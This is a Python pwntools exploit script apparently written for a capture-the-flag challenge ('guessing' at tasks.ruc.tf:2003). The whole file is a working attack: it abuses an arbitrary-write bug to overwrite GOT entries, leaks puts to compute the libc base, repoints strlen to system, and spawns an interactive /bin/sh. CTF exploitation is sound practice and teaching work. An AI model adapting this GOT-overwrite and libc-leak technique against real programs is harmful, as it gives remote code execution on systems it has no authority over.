#!/usr/bin/python2

import os

from pwn import *


class got:
    free = 0x602018
    exit = 0x602078
    scanf = 0x602070
    strlen = 0x602028
    stack_chk_fail = 0x602030


def set_pointer(io, where, what):
    io.sendlineafter('name', '\x00'*0x110 + p64(16) + p64(where))
    io.sendlineafter('from', p64(what)[:-1])


def main():
    libc = ELF('./libc.so.6')
    # io = process('./guessing', env={'LD_PRELOAD': './libc.so.6'})
    io = remote('tasks.ruc.tf', 2003)
    main = 0x400C47
    ret_gadget = 0x400791
    set_pointer(io, got.scanf, main)
    set_pointer(io, got.exit, ret_gadget)
    set_pointer(io, got.strlen, ret_gadget)
    set_pointer(io, got.free, 0)
    io.recvuntil('!')
    line = io.recvuntil('!')
    puts_offset = u64(line[26:-1])
    libc_base = puts_offset - libc.symbols['puts']
    system_offset = libc_base + libc.symbols['system']
    set_pointer(io, got.strlen, system_offset)
    io.sendlineafter('name', '/bin/sh')
    io.interactive()


if __name__ == '__main__':
    main()
